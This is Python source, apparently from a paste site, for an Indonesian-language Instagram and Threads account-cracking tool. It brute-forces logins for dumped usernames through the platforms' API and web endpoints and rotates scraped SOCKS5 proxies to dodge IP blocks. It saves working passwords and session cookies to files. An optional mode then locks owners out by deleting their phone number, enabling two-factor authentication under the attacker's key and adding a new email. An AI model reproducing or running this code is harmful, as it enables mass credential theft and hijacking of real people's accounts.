                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecApi(username, password)
        self.looping+=1
        
    def ExecApi_Threads(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                data = {'signed_body': '7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.{""id"":""{str(str(uuid.uuid4()))}"",""server_config_retrieval"":""1"",""experiments"": ""ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left""}','ig_sig_key_version': '4'}
                curl = byps.get('https://www.threads.net/api/v1/qe/sync/', data = data, allow_redirects=True)
                headers = {
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                    'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM=']),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': Useragent().useragent_api(),
                    'accept-language': 'id-ID, en-US',
                    'x-bloks-is-layout-rtl': 'false',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'www.instagram.com',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'connection': 'keep-alive',
                    'cookie': ("";"").join([ ""%s=%s"" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecApi_Threads(username, password)
        for passwd in password:
            try:
                hash = hashlib.md5()
                hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                hex_ = hash.hexdigest()
                hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))          
                payload = json.dumps({
                    'phone_id': str(uuid.uuid4()),
                    '_csrftoken': curl.cookies.get('csrftoken',None),
                    'username': username,
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-'+str(uuid.uuid4()),
                    'enc_password': Requre().enc_password(passwd),
                    'login_attempt_count': '0',
                    }
                )    
                encode = (f'signed_body=7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.'+urllib.parse.quote(payload)+'&ig_sig_key_version=4')
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.threads.net/api/v1/accounts/login/', data = encode, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break   
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)                  
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecApi_Threads(username, password)
        self.looping+=1
            
    def ExecAjax(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                curl = byps.get('https://www.instagram.com/accounts/onetap/?next=%2F&hl=en', allow_redirects=True)
                headers = {
                    'Host': 'www.instagram.com',
                    'content-length': str(random.randint(2000,2999)),
                    'x-ig-app-id': '1217981644879628',
                    'x-instagram-ajax': '1011794706',
                    'user-agent': Useragent().useragent_ajax(),
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'x-asbd-id': '129477',
                    'dpr': '2',
                    'x-csrftoken': curl.cookies.get('csrftoken',None),
                    'accept': '*/*',
                    'origin': 'https://www.instagram.com',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.instagram.com/?hl=en',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'en-US;q=0.8,en;q=0.9'
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecAjax(username, password)
        for passwd in password:
            try:          
                payload = {
                    'enc_password': Requre().enc_password(passwd),
                    'optIntoOneTap':'false',
                    'queryParams':json.dumps({""hl"":""en""}),
                    'trustedDeviceRecords':'{}',
                    'username': username,
                }
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'userId' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecAjax(username, password)
        self.looping+=1
        
    def ExecAjax_Threads(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                curl = byps.get('https://www.threads.net/accounts/onetap/?next=%2F&hl=en', allow_redirects=True)
                headers = {
                    'Host': 'www.instagram.com',
                    'content-length': str(random.randint(2000,2999)),
                    'x-ig-app-id': '1217981644879628',
                    'x-instagram-ajax': '1011794706',
                    'user-agent': Useragent().useragent_ajax(),
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'x-asbd-id': '129477',
                    'dpr': '2',
                    'x-csrftoken': curl.cookies.get('csrftoken',None),
                    'accept': '*/*',
                    'origin': 'https://www.threads.net',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.threads.net/?hl=en',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'en-US;q=0.8,en;q=0.9'
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecAjax_Threads(username, password)
        for passwd in password:
            try:          
                payload = {
                    'enc_password': Requre().enc_password(passwd),
                    'optIntoOneTap':'false',
                    'queryParams':json.dumps({""hl"":""en""}),
                    'trustedDeviceRecords':'{}',
                    'username': username,
                }
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.threads.net/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'userId' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecAjax_Threads(username, password)
        self.looping+=1
        "
QjG0wakx,140.213.57.19-/sdcard/instagram.py.py,OBF-XIn,Python,Friday 8th of March 2024 12:14:42 AM CDT,"# create by ZORA ID 2024

import os, re, sys, json, time, random, datetime, requests
import uuid, hmac, hashlib, urllib, shutil
from asset.enc_password import Requre
from asset.amankan_data import Require
from asset.useragent import Useragent
from asset.asset2.facebook import Facebook
from bs4 import BeautifulSoup as bs
from rich.tree import Tree
from rich import print as printz
from rich.panel import Panel
from rich.console import Console
from rich.columns import Columns
from concurrent.futures import ThreadPoolExecutor

dump = []
            
class Requ:
    def __init__(self) -> None:
        self.proxies = []
        pass        
        
    def Convert_Name(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://www.instagram.com/{xxx}/', headers = {""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3""}, cookies={'cookie': cookie}).text
                if 'user_id' in str(response):
                    return(re.findall('""user_id"":""(\d+)""', str(response))[0])
            except (Exception) as e: pass
            
    def Convert_Url(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(xxx, cookies={'cookie': cookie}).text
                if 'media_id' in str(response):
                    return(re.findall('{""media_id"":""(.*?)""',str(response))[0])
            except (Exception) as e: exit(e)

    def Validasi_Username(self, username):
       with requests.Session() as r:
           try:
               response = r.get(""https://i.instagram.com/api/v1/users/web_profile_info/?username={}"".format(username), headers = {""User-Agent"": ""Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3""}).json()
               return (response[""data""][""user""][""full_name""], response[""data""][""user""][""edge_followed_by""][""count""], response[""data""][""user""][""edge_follow""][""count""], response[""data""][""user""][""edge_owner_to_timeline_media""][""count""])
           except (Exception) as e: return(None,None,None,None)
        
    def Socksku(self):
        with requests.Session() as r:
            try:
                response = r.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol={}&timeout=100000&country=all&ssl=all&anonymity=all'.format('socks5')).text
                for prox in response.splitlines():
                    self.proxies.append(prox)
                return self.proxies
            except (requests.exceptions.ConnectionError): time.sleep(5); self.Socksku()                 

class Terminal:
    def __init__(self) -> None:
        pass
        
    def Clear_Terminal(self):
        os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
        
    def Banner_Terminal(self):
        self.Clear_Terminal()
        Console(width = 65, style = ""bold grey50"").print(Panel(""""""[bold red]●[bold yellow] ●[bold green] ●[bold white]
[bold red]           _____                 _____  _____)     __  
[bold red]          (, /  |       ,       (, /  /        (__/  ) 
            /---| __      __      /  /   ___     /     
[bold white]         ) /    |_/_)__(_     ___/__/     / ) ) /      
[bold white]        (_/    .-/          (__ /  (____ /   (_/       
              (_/                                            
     [bold white]Version :[bold blue] 2.0[bold white] || Status :[bold green] Premium[bold white] || Type :[bold blue] Hacking""""""))
        return (""Berhasil"")
        
    def Layar_Terminal(self):
        self.get_terminal_size = re.search('columns=(\d+),', str(os.get_terminal_size())).group(1)
        if int(self.get_terminal_size) < 65:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic red]Anda Diwajibkan Untuk Mengecilkan Tampilan Termux Sampai Kotak Ini Terlihat Rapi!...""))
            exit()
        else:
            pass
        
class Login:
    def __init__(self) -> None:
        Terminal().Layar_Terminal()
        pass
        
    def Username_And_Password(self):
        try:
            Terminal().Banner_Terminal()
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Silakan Masukan Cookie Instagram, Pastikan Akun Tidak Limite!"", subtitle = ""╭─────"", subtitle_align = ""left""))
            cookies = Console().input(""[bold grey50]   ╰─> "")
            if len(cookies) >0:
                self.username,  self.fullname = self.Validasi_Cookies(cookies)
                with open('Cookie_Instagram.json', 'w') as wr:
                    wr.write(json.dumps({
                        ""Cookie"": cookies,
                    }))
                    wr.close()
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Selamat Datang [green]{self.username}/{self.fullname}[white], Jalankan Ulang Perintahnya!!...""))
                exit()
            else:
                Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Masukan Cookie Instagram, Masukan Dengan Benar, Jangan Kosong Ngab!!...""))
                exit()
        except (KeyboardInterrupt, Exception) as e:
            Console(width = 65, style = ""bold grey50"").print(Panel(f""[italic white]Opss, Cookies Salah, Exspired Atau Limite, Silakan Ganti Akun Tumbal, Di Sarankan Membuat Akun Baru!"")) 
            exit()     
        
